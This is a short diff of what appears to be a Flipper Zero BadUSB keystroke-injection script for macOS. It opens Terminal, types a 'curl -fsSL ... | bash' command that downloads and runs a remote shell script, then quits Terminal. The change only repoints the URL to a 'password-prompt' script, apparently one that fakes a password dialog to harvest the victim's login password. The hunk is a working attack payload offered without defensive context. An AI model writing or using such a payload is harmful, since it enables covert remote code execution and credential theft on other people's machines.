@@ -11,7 +11,7 @@ STRING Terminal
 DELAY 500
 ENTER
 DELAY 500
-STRING curl -fsSL https://raw.githubusercontent.com/nwhistler/flipper-tools/master/badusb/MacOS/prompt.sh | bash
+STRING curl -fsSL https://raw.githubusercontent.com/nwhistler/flipper-tools/master/badusb/MacOS/password-prompt/prompt.sh | bash
 ENTER
 DELAY 4000
 GUI q
